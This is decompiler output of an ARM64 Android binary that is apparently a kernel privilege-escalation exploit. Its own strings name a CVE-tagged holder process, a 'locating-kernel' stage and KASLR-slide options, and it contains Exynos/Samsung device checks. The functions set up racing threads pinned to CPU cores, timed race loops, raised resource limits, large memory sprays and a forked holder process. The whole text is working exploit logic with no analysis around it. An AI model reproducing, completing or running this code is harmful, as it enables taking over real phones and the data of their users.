// ==== _FINI_1 @ 001035f0 size=16 ====

void _FINI_1(void)

{
  __cxa_finalize(&PTR_LOOP_0010c0e0);
  return;
}



// ==== FUN_00103600 @ 00103600 size=8 ====

void FUN_00103600(void)

{
  return;
}



// ==== FUN_00103610 @ 00103610 size=20 ====

void FUN_00103610(code *UNRECOVERED_JUMPTABLE)

{
  if (UNRECOVERED_JUMPTABLE != (code *)0x0) {
                    /* WARNING: Could not recover jumptable at 0x0010361c. Too many branches */
                    /* WARNING: Treating indirect jump as call */
    (*UNRECOVERED_JUMPTABLE)();
    return;
  }
  return;
}



// ==== FUN_00103624 @ 00103624 size=28 ====

void FUN_00103624(undefined8 param_1)

{
  __cxa_atexit(FUN_00103610,param_1,&PTR_LOOP_0010c0e0);
  return;
}



// ==== FUN_00103640 @ 00103640 size=16 ====

void FUN_00103640(void)

{
  __register_atfork();
  return;
}



// ==== FUN_00103650 @ 00103650 size=48 ====

int FUN_00103650(int param_1,int *param_2)

{
  char cVar1;
  bool bVar2;
  int iVar3;
  
  if (DAT_0010d718 == '\0') {
    do {
      iVar3 = *param_2;
      cVar1 = '\x01';
      bVar2 = (bool)ExclusiveMonitorPass(param_2,0x10);
      if (bVar2) {
        *param_2 = iVar3 + param_1;
        cVar1 = ExclusiveMonitorsStatus();
      }
    } while (cVar1 != '\0');
    return iVar3;
  }
  LOAcquire();
  iVar3 = *param_2;
  *param_2 = iVar3 + param_1;
  LORelease();
  return iVar3;
}



// ==== _INIT_0 @ 00103680 size=152 ====

ulong _INIT_0(void)

{
  uint uVar1;
  ulong uVar2;
  char acStack_6c [92];
  
  uVar2 = getauxval(0x10);
  if (((uint)uVar2 >> 8 & 1) == 0) {
    DAT_0010d718 = 0;
    return uVar2;
  }
  uVar2 = __system_property_get("ro.arch",acStack_6c);
  if (0 < (int)uVar2) {
    uVar1 = strncmp(acStack_6c,"exynos9810",10);
    DAT_0010d718 = 0;
    return (ulong)uVar1;
  }
  DAT_0010d718 = 1;
  return uVar2;
}



// ==== FUN_00103718 @ 00103718 size=1436 ====

/* WARNING: Type propagation algorithm not settling */

void FUN_00103718(ulong param_1,long param_2)

{
  ulong uVar1;
  uint uVar2;
  uint uVar3;
  ulong uVar4;
  ulong uVar5;
  
  uVar3 = (uint)param_1;
  if (((uint)(param_1 >> 0x3e) & 1) == 0) {
    uVar4 = 0;
  }
  else {
    uVar4 = *(ulong *)(param_2 + 0x10);
  }
  if ((uVar3 >> 7 & 1) != 0) {
    DAT_0010d720 = DAT_0010d720 | 0x400;
  }
  uVar2 = (uint)uVar4;
  if ((uVar3 >> 4 & 1) != 0) {
    DAT_0010d720 = DAT_0010d720 | 0x8000;
  }
  if ((uVar3 >> 0x1b & 1) != 0) {
    DAT_0010d720 = DAT_0010d720 | 2;
  }
  if ((uVar2 >> 7 & 1) != 0) {
    DAT_0010d720 = DAT_0010d720 | 6;
  }
  if ((~uVar3 & 0xc0000) == 0) {
    DAT_0010d720 = DAT_0010d720 | 0x20;
  }
  if ((uVar3 >> 0x14 & 1) != 0) {
    DAT_0010d720 = DAT_0010d720 | 0x10;
  }
  if ((uVar3 >> 0x17 & 1) != 0) {
    DAT_0010d720 = DAT_0010d720 | 8;
  }
  if ((uVar3 >> 9 & 1) != 0) {
    DAT_0010d720 = DAT_0010d720 | 0x10100;
  }
  if ((uVar3 >> 0x18 & 1) != 0) {
    DAT_0010d720 = DAT_0010d720 | 0x20000;
  }
  if ((uVar3 >> 0xc & 1) != 0) {
    DAT_0010d720 = DAT_0010d720 | 0x40;
  }
  if ((uVar3 >> 0x1a & 1) != 0) {
    DAT_0010d720 = DAT_0010d720 | 0x800000;
  }
  if ((uVar3 >> 3 & 1) != 0) {
    DAT_0010d720 = DAT_0010d720 | 0x4000;
  }
  if ((uVar3 >> 5 & 1) != 0) {
    DAT_0010d720 = DAT_0010d720 | 0x800;
  }
  if ((uVar3 >> 6 & 1) != 0) {
    DAT_0010d720 = DAT_0010d720 | 0x1000;
  }
  if ((uVar3 >> 0xd & 1) != 0) {
    DAT_0010d720 = DAT_0010d720 | 0x100000;
  }
  if ((uVar3 >> 0xe & 1) != 0) {
    DAT_0010d720 = DAT_0010d720 | 0x200000;
  }
  if ((uVar3 >> 0x1d & 1) != 0) {
    DAT_0010d720 = DAT_0010d720 | 0x400000000000;
  }
  if ((uVar3 >> 0x1c & 1) != 0) {
    DAT_0010d720 = DAT_0010d720 | 0x2000000000000;
  }
  if ((uVar2 >> 0x12 & 1) != 0) {
    DAT_0010d720 = DAT_0010d720 | 0x180000000000;
  }
  if ((uVar2 >> 0x16 & 1) != 0) {
    DAT_0010d720 = DAT_0010d720 | 0x380000000000;
  }
  if ((uVar2 >> 2 & 1) != 0) {
    DAT_0010d720 = DAT_0010d720 | 0x2000000000;
  }
  if ((uVar2 >> 3 & 1) != 0) {
    DAT_0010d720 = DAT_0010d720 | 0x6000000000;
  }
  if ((uVar2 >> 4 & 1) != 0) {
    DAT_0010d720 = DAT_0010d720 | 0x8000000000;
  }
  if ((uVar2 >> 5 & 1) != 0) {
    DAT_0010d720 = DAT_0010d720 | 0x10000000000;
  }
  if ((uVar2 >> 6 & 1) != 0) {
    DAT_0010d720 = DAT_0010d720 | 0x20000000000;
  }
  if ((uVar4 & 1) != 0) {
    DAT_0010d720 = DAT_0010d720 | 0x80000;
  }
  if ((uVar3 >> 8 & 1) != 0) {
    DAT_0010d720 = DAT_0010d720 | 0x80;
  }
  if ((uVar2 >> 0x10 & 1) != 0) {
    DAT_0010d720 = DAT_0010d720 | 1;
  }
  if ((uVar2 >> 0xd & 1) != 0) {
    DAT_0010d720 = DAT_0010d720 | 0x4000000;
  }
  if ((uVar4 >> 0x20 & 1) != 0) {
    DAT_0010d720 = DAT_0010d720 | 0x10000000;
  }
  if ((uVar4 >> 0x21 & 1) != 0) {
    DAT_0010d720 = DAT_0010d720 | 0x100000000;
  }
  if ((uVar2 >> 0xf & 1) != 0) {
    DAT_0010d720 = DAT_0010d720 | 0x2000000;
  }
  if ((uVar2 >> 8 & 1) != 0) {
    DAT_0010d720 = DAT_0010d720 | 0x1000000;
  }
  if ((uVar2 >> 9 & 1) != 0) {
    DAT_0010d720 = DAT_0010d720 | 0x200000000;
  }
  if ((uVar2 >> 10 & 1) != 0) {
    DAT_0010d720 = DAT_0010d720 | 0x400000000;
  }
  if ((uVar2 >> 0xb & 1) != 0) {
    DAT_0010d720 = DAT_0010d720 | 0x800000000;
  }
  if ((uVar2 >> 0x11 & 1) != 0) {
    DAT_0010d720 = DAT_0010d720 | 0x4000000000000;
  }
  if ((uVar2 >> 0x15 & 1) != 0) {
    DAT_0010d720 = DAT_0010d720 | 0x20000000;
  }
  if ((int)uVar2 < 0) {
    DAT_0010d720 = DAT_0010d720 | 0x40000000000000;
  }
  if ((uVar2 >> 0x17 & 1) != 0) {
    DAT_0010d720 = DAT_0010d720 | 0x40000000000;
  }
  if ((uVar2 >> 0x18 & 1) != 0) {
    DAT_0010d720 = DAT_0010d720 | 0x100000000000000;
  }
  if ((uVar2 >> 0x19 & 1) != 0) {
    DAT_0010d720 = DAT_0010d720 | 0x80000000000000;
  }
  if ((uVar4 >> 0x2b & 1) != 0) {
    DAT_0010d720 = DAT_0010d720 | 0x800000000000000;
  }
  if ((uVar3 >> 0xb & 1) == 0) {
    if ((param_1 & 0x201) != 0) {
      DAT_0010d720 = DAT_0010d720 | 0x300;
    }
    if ((uVar4 & 1) != 0 || (param_1 & 0x10000) != 0) {
      DAT_0010d720 = DAT_0010d720 | 0x40000;
    }
    if ((param_1 & 0x4008000) != 0) {
      DAT_0010d720 = DAT_0010d720 | 0x400000;
    }
    if ((uVar4 & 0x100004000) != 0) {
      DAT_0010d720 = DAT_0010d720 | 0x8000000;
    }
    uVar5 = DAT_0010d720 | (ulong)(uVar2 << 0x13) & 0x80000000;
    if ((uVar4 & 2) != 0 && (param_1 & 0x400000) != 0) {
      uVar5 = uVar5 | 0x1000000000;
    }
    uVar5 = uVar5 | (param_1 & 0x20000) >> 4;
    goto LAB_00103880;
  }
  uVar4 = id_aa64pfr1_el1;
  if ((uVar4 & 0xf00) != 0) {
    DAT_0010d720 = DAT_0010d720 | 0x80000000000;
  }
  if ((uVar4 & 0xf0) == 0x10) {
    DAT_0010d720 = DAT_0010d720 | 0x1000000000000;
    if ((uVar4 & 0xf000000) != 0x2000000) goto LAB_00103b70;
LAB_00103bc4:
    DAT_0010d720 = DAT_0010d720 | 0x200000000000000;
    uVar4 = id_aa64pfr0_el1;
    uVar3 = (uint)uVar4;
  }
  else {
    if ((uVar4 & 0xf000000) == 0x2000000) goto LAB_00103bc4;
LAB_00103b70:
    uVar4 = id_aa64pfr0_el1;
    uVar3 = (uint)uVar4;
  }
  if ((~uVar3 & 0xf0000) != 0) {
    DAT_0010d720 = DAT_0010d720 | 0x300;
  }
  if ((uVar4 & 0xf00000000) != 0) {
    uVar4 = UnkSytemRegRead(3,0,0,4,4);
    if ((uVar4 & 0xf) == 1) {
      DAT_0010d720 = DAT_0010d720 | 0x1000000000;
    }
    else if ((uVar4 & 0xf) == 0) {
      DAT_0010d720 = DAT_0010d720 | 0x40000000;
    }
    if ((uVar4 & 0xf00000) != 0) {
      DAT_0010d720 = DAT_0010d720 | 0x80000000;
    }
  }
  uVar4 = id_aa64isar0_el1;
  if ((uVar4 & 0xf00000000) != 0) {
    DAT_0010d720 = DAT_0010d720 | 0x2000;
  }
  uVar4 = id_aa64isar1_el1;
  uVar5 = uVar4 >> 0x14 & 0xf;
  if ((uVar4 & 0xf) != 0) {
    DAT_0010d720 = DAT_0010d720 | 0x40000;
  }
  if (uVar5 != 0) {
    if (uVar5 == 3) {
      DAT_0010d720 = DAT_0010d720 | 0x400000000400000;
    }
    else {
      DAT_0010d720 = DAT_0010d720 | 0x400000;
    }
  }
  uVar5 = DAT_0010d720 | 0x800000000000;
  if ((uVar4 & 0xf0000000000) != 0x20000000000) {
    uVar5 = DAT_0010d720;
  }
  if ((uVar4 & 0xf00000000000) != 0) {
    uVar5 = uVar5 | 0x8000000;
  }
  if (uVar4 >> 0x3c != 0) {
    if (uVar4 >> 0x3d == 0) {
      DAT_0010d720 = uVar5 | 0x8008000000000000;
      return;
    }
    uVar1 = 0x38000000000000;
    if (uVar4 >> 0x3c < 3) {
      uVar1 = 0x18000000000000;
    }
    DAT_0010d720 = uVar5 | uVar1 | 0x8000000000000000;
    return;
  }
LAB_00103880:
  DAT_0010d720 = uVar5 | 0x8000000000000000;
  return;
}



// ==== _INIT_1 @ 00103cb4 size=140 ====

void _INIT_1(void)

{
  int iVar1;
  ulong uVar2;
  char local_70 [8];
  ulong uStack_68;
  undefined8 local_60;
  
  if (DAT_0010d720 != 0) {
    return;
  }
  iVar1 = __system_property_get("ro.arch",local_70);
  if ((iVar1 < 1) || (iVar1 = strncmp(local_70,"exynos9810",10), iVar1 != 0)) {
    uVar2 = getauxval(0x10);
    local_60 = getauxval(0x1a);
    local_70[0] = '\x18';
    local_70[1] = '\0';
    local_70[2] = '\0';
    local_70[3] = '\0';
    local_70[4] = '\0';
    local_70[5] = '\0';
    local_70[6] = '\0';
    local_70[7] = '\0';
    uStack_68 = uVar2;
    FUN_00103718(uVar2 | 0x4000000000000000,local_70);
  }
  return;
}



// ==== FUN_00103d40 @ 00103d40 size=44 ====

undefined4 FUN_00103d40(undefined4 param_1,undefined4 *param_2)

{
  char cVar1;
  bool bVar2;
  undefined4 uVar3;
  
  if (DAT_0010d718 == '\0') {
    do {
      uVar3 = *param_2;
      cVar1 = '\x01';
      bVar2 = (bool)ExclusiveMonitorPass(param_2,0x10);
      if (bVar2) {
        *param_2 = param_1;
        cVar1 = ExclusiveMonitorsStatus();
      }
    } while (cVar1 != '\0');
    return uVar3;
  }
  LOAcquire();
  uVar3 = *param_2;
  *param_2 = param_1;
  LORelease();
  return uVar3;
}



// ==== FUN_00103e18 @ 00103e18 size=984 ====

/* WARNING: Removing unreachable block (ram,0x00103fa8) */
/* WARNING: Removing unreachable block (ram,0x00103fb4) */
/* WARNING: Removing unreachable block (ram,0x00103fc0) */
/* WARNING: Removing unreachable block (ram,0x00103fcc) */
/* WARNING: Removing unreachable block (ram,0x00103fd8) */
/* WARNING: Removing unreachable block (ram,0x00103fe4) */
/* WARNING: Removing unreachable block (ram,0x001040e0) */
/* WARNING: Removing unreachable block (ram,0x00104158) */
/* WARNING: Removing unreachable block (ram,0x001040e8) */
/* WARNING: Removing unreachable block (ram,0x00104108) */
/* WARNING: Removing unreachable block (ram,0x00104114) */
/* WARNING: Removing unreachable block (ram,0x00104120) */
/* WARNING: Removing unreachable block (ram,0x0010412c) */
/* WARNING: Removing unreachable block (ram,0x00104150) */

undefined8 FUN_00103e18(void)

{
  long lVar1;
  bool bVar2;
  int iVar3;
  long lVar4;
  undefined4 *extraout_x8;
  ulong uVar5;
  undefined4 *extraout_x9;
  undefined4 extraout_w10;
  _union_1457 local_80;
  undefined1 *puStack_78;
  ulong uStack_70;
  ulong uStack_68;
  ulong local_58;
  
  lVar1 = tpidr_el0;
  local_58 = *(ulong *)(lVar1 + 0x28);
  FUN_001041f0(3);
  lVar4 = syscall(0xb2);
  DAT_0010d730 = (undefined4)lVar4;
  uStack_68 = 0;
  uStack_70 = 0;
  puStack_78 = &LAB_00103d6c;
  local_80.sa_handler = (__sighandler_t)0x10000004;
  sigemptyset((sigset_t *)&stack0xffffffffffffff90);
  iVar3 = sigaction(10,(sigaction *)&local_80,(sigaction *)0x0);
  if (iVar3 == 0) {
    FUN_00104918(&DAT_0010d738,6);
    lVar4 = FUN_00105688();
    if (lVar4 == 0) {
      DAT_0010d73c = 1;
      while (DAT_0010d740 == 0) {
        FUN_0010493c();
      }
      iVar3 = clock_gettime(1,(timespec *)&local_80);
      if (iVar3 != -1) {
        local_80.sa_handler = local_80.sa_handler + 8;
        DAT_0010d744 = 1;
        FUN_00105688(&DAT_0010d748,0xb,0,&local_80,0x10d74c,0);
        uVar5 = 0;
        do {
          Yield();
          bVar2 = uVar5 < 99999999;
          uVar5 = uVar5 + 1;
        } while (bVar2);
        DAT_0010d76c = 0xffffffff;
        DAT_0010d768 = 0;
        DAT_0010d764 = 0;
        DAT_0010d760 = 0;
        DAT_0010d75c = 0;
        DAT_0010d754 = 0;
        DAT_0010d750 = 0;
        FUN_00104918(&DAT_0010d76c,&DAT_0010d738,7);
        *extraout_x8 = 0;
        *extraout_x9 = extraout_w10;
        DAT_0010d734 = extraout_w10;
        FUN_00105688();
        while (DAT_0010d758 == 0) {
          FUN_0010493c();
        }
        if (*(ulong *)(lVar1 + 0x28) != local_58) {
                    /* WARNING: Subroutine does not return */
          __stack_chk_fail();
        }
        return 0;
      }
    }
  }
  FUN_001048f8();
                    /* WARNING: Subroutine does not return */
  FUN_00104934();
}



// ==== FUN_001041f0 @ 001041f0 size=132 ====

void FUN_001041f0(ulong param_1)

{
  long lVar1;
  int iVar2;
  cpu_set_t local_a8;
  long local_28;
  
  lVar1 = tpidr_el0;
  local_28 = *(long *)(lVar1 + 0x28);
  local_a8.__bits[0] = 1L << (param_1 & 0x3f);
  local_a8.__bits[0xf] = 0;
  local_a8.__bits[4] = 0;
  local_a8.__bits[3] = 0;
  local_a8.__bits[6] = 0;
  local_a8.__bits[5] = 0;
  local_a8.__bits[8] = 0;
  local_a8.__bits[7] = 0;
  local_a8.__bits[10] = 0;
  local_a8.__bits[9] = 0;
  local_a8.__bits[0xc] = 0;
  local_a8.__bits[0xb] = 0;
  local_a8.__bits[0xe] = 0;
  local_a8.__bits[0xd] = 0;
  local_a8.__bits[2] = 0;
  local_a8.__bits[1] = 0;
  iVar2 = sched_setaffinity(0,0x80,&local_a8);
  if (iVar2 == -1) {
    FUN_001048f8();
                    /* WARNING: Subroutine does not return */
    FUN_00104934();
  }
  if (*(long *)(lVar1 + 0x28) == local_28) {
    return;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}



// ==== FUN_00104274 @ 00104274 size=140 ====

void FUN_00104274(void)

{
  long lVar1;
  undefined4 *extraout_x8;
  
  FUN_00104918(0x10d74c,6);
  lVar1 = FUN_00105688();
  if (lVar1 != 0) {
    FUN_001048f8();
                    /* WARNING: Subroutine does not return */
    FUN_00104934();
  }
  while (DAT_0010d73c == 0) {
    FUN_0010493c();
  }
  FUN_00104918(&DAT_0010d740,&DAT_0010d738,6);
  *extraout_x8 = 1;
  FUN_00105688();
  DAT_0010d758 = 1;
  do {
    sleep(1);
  } while( true );
}



// ==== FUN_00104300 @ 00104300 size=500 ====

/* WARNING: Removing unreachable block (ram,0x00104398) */

undefined8 FUN_00104300(void)

{
  int iVar1;
  undefined8 uVar2;
  undefined4 uVar3;
  int iVar4;
  int iVar5;
  char *__nptr;
  undefined4 *puVar6;
  long lVar7;
  int iVar8;
  long lVar9;
  
  FUN_001041f0(1);
  if (DAT_0010d764 == 0) {
    iVar8 = 0;
    do {
      iVar4 = DAT_0010d76c;
      uVar3 = DAT_0010d730;
      if (DAT_0010d76c == 0) {
LAB_001043a4:
        Yield();
      }
      else if (DAT_0010d76c == -1) {
        DAT_0010d754 = 1;
        if (DAT_0010d764 == 0) {
          do {
            Yield();
          } while( true );
        }
      }
      else {
        if (DAT_0010d76c == iVar8) goto LAB_001043a4;
        iVar8 = iVar4;
        if (DAT_0010d764 == 0) {
          iVar1 = DAT_0010d76c + -1;
          do {
            if (DAT_0010d76c != iVar4) break;
            if ((DAT_0010d764 == 0) && (DAT_0010d76c == iVar4)) {
              if (0 < (int)DAT_0010d768) {
                usleep(DAT_0010d768);
              }
              __nptr = getenv("S23_SUPERVISOR_ATTEMPT");
              if ((__nptr == (char *)0x0) || (*__nptr == '\0')) {
                iVar5 = 1;
              }
              else {
                iVar5 = atoi(__nptr);
                if (iVar5 < 2) {
                  iVar5 = 1;
                }
              }
              lVar7 = cntvct_el0;
              lVar9 = cntvct_el0;
              while ((ulong)(lVar9 - lVar7) <
                     *(ulong *)(&DAT_00102240 + (ulong)(iVar5 - 1U & 7) * 8)) {
                Yield();
                lVar9 = cntvct_el0;
              }
              if ((DAT_0010d764 == 0) && (DAT_0010d76c == iVar4)) {
                FUN_00103650(1,&DAT_0010d75c);
                puVar6 = (undefined4 *)__errno();
                *puVar6 = 0;
                uVar2 = cntvct_el0;
                lVar7 = FUN_001056a8(uVar2,uVar3,((iVar1 / 8) * 8 - iVar1) + 0x13);
                if (lVar7 == 0) {
                  FUN_00103650(1,&DAT_0010d760);
                }
                DAT_0010d750 = 1;
                DAT_0010d76c = 0;
              }
            }
          } while (DAT_0010d764 == 0);
        }
      }
    } while (DAT_0010d764 == 0);
  }
  return 0;
}



// ==== FUN_001044f4 @ 001044f4 size=1028 ====

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */
/* WARNING: Enum "__rlimit_resource": Some values do not have unique names */

bool FUN_001044f4(void)

{
  long lVar1;
  bool bVar2;
  int iVar3;
  __pid_t _Var4;
  char *pcVar5;
  undefined4 *puVar6;
  ulong uVar7;
  undefined8 extraout_x1;
  uint uVar8;
  uint uVar9;
  rlimit local_70;
  undefined1 auStack_58 [8];
  undefined1 auStack_50 [8];
  long local_48;
  
  lVar1 = tpidr_el0;
  local_48 = *(long *)(lVar1 + 0x28);
  iVar3 = getrlimit(RLIMIT_NOFILE,&local_70);
  if (iVar3 == -1) {
LAB_001047fc:
    FUN_001048f8();
                    /* WARNING: Subroutine does not return */
    FUN_00104934();
  }
  local_70.rlim_cur = local_70.rlim_max;
  iVar3 = setrlimit(RLIMIT_NOFILE,&local_70);
  if ((iVar3 == -1) || (iVar3 = getrlimit(__RLIMIT_NPROC,&local_70), iVar3 == -1))
  goto LAB_001047fc;
  local_70.rlim_cur = local_70.rlim_max;
  iVar3 = setrlimit(__RLIMIT_NPROC,&local_70);
  if (iVar3 == -1) goto LAB_001047fc;
  FUN_001054f0();
  FUN_001057e0();
  FUN_001041f0(0);
  iVar3 = puts("\x1b[33m[*] \x1b[0mstage=locating-kernel");
  iVar3 = FUN_0010757c(iVar3);
  if (iVar3 == 0) goto LAB_001047fc;
  puts("\x1b[33m[*] \x1b[0mstage=kernel-location-ready");
  pcVar5 = getenv("SLIDE_ONLY");
  if ((pcVar5 != (char *)0x0) || (pcVar5 = getenv("P0_ONLY"), pcVar5 != (char *)0x0)) {
    bVar2 = false;
    goto LAB_001045cc;
  }
  FUN_001041f0();
  DAT_0010d978 = FUN_00106fa4(0);
  DAT_0010d748 = 0;
  DAT_0010d738 = 0;
  DAT_0010d73c = 0;
  DAT_0010d744 = 0;
  DAT_0010d740 = 0;
  DAT_0010d758 = 0;
  DAT_0010d734 = 0;
  DAT_0010d730 = 0;
  DAT_0010d76c = 0;
  DAT_0010d764 = 0;
  DAT_0010d75c = 0;
  DAT_0010d760 = 0;
  DAT_0010d750 = 0;
  DAT_0010d768 = 50000;
  DAT_0010d770 = 0;
  DAT_0010d774 = 0;
  DAT_0010da40 = 0;
  iVar3 = pthread_create(&local_70.rlim_cur,(pthread_attr_t *)0x0,FUN_00103e18,(void *)0x0);
  if (((iVar3 == -1) || (iVar3 = FUN_00104944(auStack_50), iVar3 == -1)) ||
     (iVar3 = FUN_00104944(auStack_58,extraout_x1,FUN_00104300), iVar3 == -1)) goto LAB_001047fc;
  while ((DAT_0010d744 == 0 || (DAT_0010d740 == 0))) {
    FUN_0010493c();
  }
  iVar3 = usleep(100000);
  puVar6 = (undefined4 *)__errno(iVar3);
  *puVar6 = 0;
  FUN_00105688(&DAT_0010d748,0xc,1,1,0x10d74c,0);
  while (DAT_0010d734 == 0) {
    iVar3 = FUN_00103d40(0,&DAT_0010d770);
    if (iVar3 != 0) {
      DAT_0010dae0 = FUN_00107dd4();
      DAT_0010d774 = 1;
    }
    usleep(10000);
  }
  if ((0 < DAT_0010d714) &&
     ((iVar3 = kill(DAT_0010d714,9), iVar3 == -1 ||
      (_Var4 = waitpid(DAT_0010d714,(int *)0x0,0), _Var4 == -1)))) goto LAB_001047fc;
  bVar2 = DAT_0010da44 == 0 || DAT_0010ea68 == 0;
  if (bVar2) {
LAB_001045cc:
    if (*(long *)(lVar1 + 0x28) == local_48) {
      return bVar2;
    }
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  _Var4 = fork();
  if (_Var4 != 0) {
    if (_Var4 == -1) goto LAB_001047fc;
    goto LAB_001045cc;
  }
  syscall(0xa7,1,0,0,0,0);
  syscall(0xa7,0xf,"cve43499-hold",0,0,0);
  syscall(0x9d);
  uVar7 = syscall(0x38,0xffffff9c,"/dev/null",0x80002,0);
  uVar8 = (uint)uVar7;
  if ((int)uVar8 < 0) {
    syscall(0x39,0);
    syscall(0x39,1);
    uVar7 = 2;
  }
  else {
    uVar9 = 0;
    do {
      if (uVar8 != uVar9) {
        syscall(0x18,uVar7 & 0xffffffff,(ulong)uVar9,0);
      }
      uVar9 = uVar9 + 1;
    } while (uVar9 != 3);
    if ((int)uVar8 < 3) goto code_r0x001048d4;
  }
  syscall(0x39,uVar7 & 0xffffffff);
code_r0x001048d4:
  local_70.rlim_max = _UNK_001022a8;
  local_70.rlim_cur = _DAT_001022a0;
  do {
    syscall(0x65,&local_70,0);
  } while( true );
}



// ==== FUN_001048f8 @ 001048f8 size=32 ====

void FUN_001048f8(void)

{
  fwrite(&DAT_00102155,0x1e,1,*(FILE **)PTR_stderr_0010c2c8);
  return;
}



// ==== FUN_00104918 @ 00104918 size=20 ====

void FUN_00104918(void)

{
  return;
}



// ==== FUN_0010492c @ 0010492c size=8 ====

void FUN_0010492c(undefined8 param_1,undefined8 param_2)

{
  FUN_00105e18(param_1,param_2,0);
  return;
}



// ==== FUN_00104934 @ 00104934 size=8 ====

void FUN_00104934(void)

{
                    /* WARNING: Subroutine does not return */
  exit(-1);
}



// ==== FUN_0010493c @ 0010493c size=8 ====

int FUN_0010493c(void)

{
  int iVar1;
  
  iVar1 = usleep(1000);
  return iVar1;
}



// ==== FUN_00104944 @ 00104944 size=12 ====

int FUN_00104944(pthread_t *param_1,undefined8 param_2,__start_routine *param_3)

{
  int iVar1;
  
  iVar1 = pthread_create(param_1,(pthread_attr_t *)0x0,param_3,(void *)0x0);
  return iVar1;
}



// ==== FUN_00104950 @ 00104950 size=216 ====

uint FUN_00104950(undefined8 param_1,undefined8 param_2)

{
  int iVar1;
  uint uVar2;
  int iVar3;
  uint uVar4;
  uint uVar5;
  
  uVar4 = (uint)param_1 & 0xfffff000;
  iVar1 = ((uint)param_1 & 0xfff) + 0xdeadbeff;
  uVar2 = iVar1 + uVar4;
  uVar4 = (int)param_2 - uVar4 ^ (uVar2 >> 0x1c | uVar2 * 0x10);
  iVar1 = iVar1 + (int)((ulong)param_2 >> 0x20);
  iVar3 = uVar2 + iVar1;
  uVar2 = iVar1 - uVar4 ^ (uVar4 >> 0x1a | uVar4 << 6);
  iVar1 = uVar4 + iVar3;
  uVar4 = iVar3 - uVar2 ^ (uVar2 >> 0x18 | uVar2 << 8);
  iVar3 = uVar2 + iVar1;
  uVar2 = iVar1 - uVar4 ^ (uVar4 >> 0x10 | uVar4 << 0x10);
  iVar1 = uVar4 + iVar3;
  uVar4 = iVar3 - uVar2 ^ (uVar2 >> 0xd | uVar2 << 0x13);
  iVar3 = uVar2 + iVar1;
  uVar2 = uVar4 + iVar3;
  uVar4 = (iVar1 - uVar4 ^ (uVar4 >> 0x1c | uVar4 << 4) ^ uVar2) - (uVar2 >> 0x12 | uVar2 * 0x4000);
  uVar5 = (uVar4 ^ iVar3 + (int)((ulong)param_1 >> 0x20)) - (uVar4 >> 0x15 | uVar4 * 0x800);
  uVar2 = (uVar5 ^ uVar2) - (uVar5 >> 7 | uVar5 * 0x2000000);
  uVar4 = (uVar2 ^ uVar4) - (uVar2 >> 0x10 | uVar2 * 0x10000);
  uVar5 = (uVar4 ^ uVar5) - (uVar4 >> 0x1c | uVar4 * 0x10);
  uVar2 = (uVar5 ^ uVar2) - (uVar5 >> 0x12 | uVar5 * 0x4000);
  return DAT_0010d5f8 - 1U & (uVar2 ^ uVar4) - (uVar2 >> 8 | uVar2 * 0x1000000);
}



// ==== FUN_00104a28 @ 00104a28 size=456 ====

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

undefined8 *
FUN_00104a28(undefined8 param_1,undefined8 param_2,undefined8 param_3,long param_4,
            undefined8 param_5,__off_t param_6)

{
  undefined8 *puVar1;
  long lVar2;
  void *pvVar3;
  size_t __len;
  int iVar4;
  int iVar5;
  int iVar6;
  undefined8 uVar7;
  __off_t _Var8;
  long extraout_x8;
  long extraout_x8_00;
  ulong extraout_x8_01;
  undefined8 extraout_x9;
  ulong extraout_x9_00;
  long extraout_x10;
  ulong uVar9;
  undefined8 extraout_d0;
  undefined8 extraout_var;
  undefined1 auVar10 [16];
  
  iVar6 = 3;
  iVar4 = 0x21;
  uVar7 = param_5;
  _Var8 = param_6;
  auVar10 = FUN_0010748c(0,0x10b0);
  iVar5 = (int)uVar7;
  puVar1 = mmap(auVar10._0_8_,auVar10._8_8_,iVar6,iVar4,iVar5,_Var8);
  if (puVar1 != (undefined8 *)0xffffffffffffffff) {
    puVar1[0x20f] = 0xffffffffffffffff;
    *puVar1 = param_1;
    puVar1[1] = param_2;
    lVar2 = FUN_00107484();
    uVar7 = _DAT_00102290;
    puVar1[3] = param_4;
    puVar1[4] = param_3;
    puVar1[5] = lVar2 << 1;
    puVar1[2] = param_5;
    iVar6 = 3;
    iVar4 = 0x21;
    puVar1[10] = 8;
    pvVar3 = (void *)FUN_0010748c(lVar2 * 0x200 * param_4,uVar7,0);
    *(int *)((long)puVar1 + 0x10ac) = (int)param_6;
    puVar1[9] = extraout_var;
    puVar1[8] = extraout_d0;
    puVar1[6] = extraout_x9;
    puVar1[7] = extraout_x8 << 2;
    pvVar3 = mmap(pvVar3,extraout_x8 << 5,iVar6,iVar4,iVar5,_Var8);
    if (pvVar3 != (void *)0xffffffffffffffff) {
      puVar1[0x20d] = pvVar3;
      uVar7 = 0xffffffff;
      _Var8 = 0;
      pvVar3 = mmap((void *)0x0,puVar1[4] << 3,3,0x21,-1,0);
      if (pvVar3 != (void *)0xffffffffffffffff) {
        puVar1[0x210] = pvVar3;
        iVar6 = 0;
        iVar4 = 0x4022;
        auVar10 = FUN_0010748c(0,0x1000000000);
        pvVar3 = mmap(auVar10._0_8_,auVar10._8_8_,iVar6,iVar4,(int)uVar7,_Var8);
        if (pvVar3 != (void *)0xffffffffffffffff) {
          uVar9 = 0;
          puVar1[0xb] = pvVar3;
          do {
            iVar6 = (int)uVar7;
            if (uVar9 >> 0x24 != 0) {
              iVar4 = 3;
              iVar5 = 0x21;
              pvVar3 = (void *)FUN_0010748c(puVar1[4],0);
              uVar9 = 0;
              if (extraout_x8_01 != 0) {
                uVar9 = extraout_x9_00 / extraout_x8_01;
              }
              puVar1[0x214] = uVar9;
              pvVar3 = mmap(pvVar3,extraout_x10 * 8 + 8,iVar4,iVar5,iVar6,_Var8);
              if (pvVar3 != (void *)0xffffffffffffffff) {
                puVar1[0x20c] = pvVar3;
                FUN_00104bf0();
                lVar2 = FUN_00107484();
                *(undefined4 *)(puVar1 + 0x215) = 1;
                _DAT_0010d5f8 = lVar2 << 8;
                return puVar1;
              }
              break;
            }
            iVar6 = 3;
            iVar4 = 0x31;
            FUN_0010748c(puVar1[0xb],pvVar3,0x40000000);
            pvVar3 = mmap((void *)(uVar9 + extraout_x8_00),__len,iVar6,iVar4,(int)uVar7,_Var8);
            uVar9 = uVar9 + 0x40000000;
          } while (pvVar3 != (void *)0xffffffffffffffff);
        }
      }
    }
  }
  FUN_001048f8();
                    /* WARNING: Subroutine does not return */
  FUN_00104934();
}



